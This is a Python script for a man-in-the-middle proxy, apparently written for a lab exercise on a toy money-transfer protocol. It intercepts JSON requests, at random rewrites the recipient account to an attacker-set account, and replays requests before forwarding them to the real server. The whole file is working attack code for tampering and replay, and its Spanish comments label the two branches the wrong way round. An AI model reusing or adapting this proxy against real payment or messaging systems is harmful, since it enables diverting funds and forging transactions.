import socket
import json
import time
from random import random
import conf

HOST = conf.MITM_IP
PORT = conf.MITM_PORT
NEW_ACCOUNT = conf.NEW_ACCOUNT
REDIRECT_IP = conf.SERVER_IP
REDIRECT_PORT = conf.SERVER_PORT
DEBUG_MODE = conf.DEBUG_MODE
REPLY_CHANCE = conf.REPLY_CHANCE
MODIFY_CHANCE = conf.MODIFY_CHANCE


class MITM:
    def __init__(self, host='127.0.0.1', port=55332, redirect_ip='127.0.0.1', redirect_port=55333):
        self.host = host
        self.port = port
        self.redirect_ip = redirect_ip
        self.redirect_port = redirect_port

    @staticmethod
    def change_destination_account(data, new_account):
        print(data)
        data["message"]["account2"] = new_account
        print(data)

    def redirect(self, request):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.redirect_ip, self.redirect_port))
            dumped_data = json.dumps(request)
            s.sendall(bytes(dumped_data, encoding="utf-8"))
            response = s.recv(1024)
            return response

    def run(self):
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((self.host, self.port))
                s.listen()
                conn, addr = s.accept()
                with conn:
                    if DEBUG_MODE:
                        print('Connected by', addr)
                    while True:
                        data = conn.recv(1024)
                        if not data:
                            break
                        if DEBUG_MODE:
                            print(data)

                        client_data = json.loads(data)

                        if random() < REPLY_CHANCE:
                            #Modificar
                            self.change_destination_account(client_data, NEW_ACCOUNT)
                        response = self.redirect(client_data)
                        server_data = json.loads(response)
                        dumped_response = json.dumps(server_data)

                        if random() < MODIFY_CHANCE:
                            #Reply
                            time.sleep(0.1)
                            self.redirect(client_data)

                        conn.sendall(bytes(dumped_response, encoding="utf-8"))

                s.close()


if __name__ == "__main__":
    server = MITM(HOST, PORT, REDIRECT_IP, REDIRECT_PORT)
    server.run()
